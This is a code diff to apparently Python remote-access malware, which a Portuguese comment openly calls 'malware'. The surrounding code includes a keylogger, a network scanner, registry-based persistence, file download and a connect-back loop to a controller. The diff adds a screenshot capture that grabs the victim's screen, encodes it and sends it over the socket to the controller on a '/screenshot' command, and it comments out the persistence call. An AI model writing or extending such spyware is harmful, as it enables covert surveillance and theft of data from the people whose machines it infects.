@@ -2,6 +2,7 @@ from datetime import datetime
 from pynput import keyboard
 from pathlib import Path
 from time import time
+from PIL import ImageGrab
 
 import concurrent.futures
 import subprocess
@@ -11,6 +12,7 @@ import socket
 import winreg
 import base64
 import os
+import io
 import sys
 
 #WARNING : NUNCA EXECUTE ESSE MALWARE NO SEU PROPRIO PC , SE FOR TESTAR , TESTE EM MAQUINAS VIRTUAIS 
@@ -26,6 +28,28 @@ buffer_auto_send_pending = False
 keylloger_active = False
 listener = None
 
+
+def take_screenshot(c):
+    try:
+        img = ImageGrab.grab()
+        buf = io.BytesIO()
+        img.save(buf, format='PNG')
+        raw_bytes = buf.getvalue()
+        
+        encoded = base64.b16encode(raw_bytes).decode('utf-8')
+        
+        header = (
+            f'[+] Screenshot captured\n'
+            f'[+] Filename: {datetime.now().strftime('%Y-%m-%d %H-%M-%S:')}screenshot.png\n'
+            f'[+] Size: {len(raw_bytes)} bytes'
+            f'[+] [FILE_START]\n'
+        )
+        c.send(header.encode())
+        c.send(encoded.encode())
+        c.send(b'[FILE_START]\n')
+    
+    except Exception as e:
+        c.send(f'[-] Screenshot failed: {e}\n\n'.encode())
 
 def tcp_scanner(base_ip, c):
     open_host = []
@@ -332,7 +356,12 @@ def cmd(c, data):
             response = f'[i] Keylogger status: {status}\n[i] Buffer: {buffer_size} keys'
             c.send(response.encode() + b'\n\n')
             return
-            
+        
+        elif data == '/screenshot':
+            take_screenshot(c)
+            return
+        
+        
         elif data.startswith('/download'):
             filepath = data[10:].strip()
             c.send(b'[i] Preparing file for download ...\n')
@@ -418,7 +447,7 @@ def cmd(c, data):
 if __name__ == '__main__':
 
     try:
-        setup_persistence()
+        #setup_persistence()
 
         while True:
             client = connect(IP, PORT)
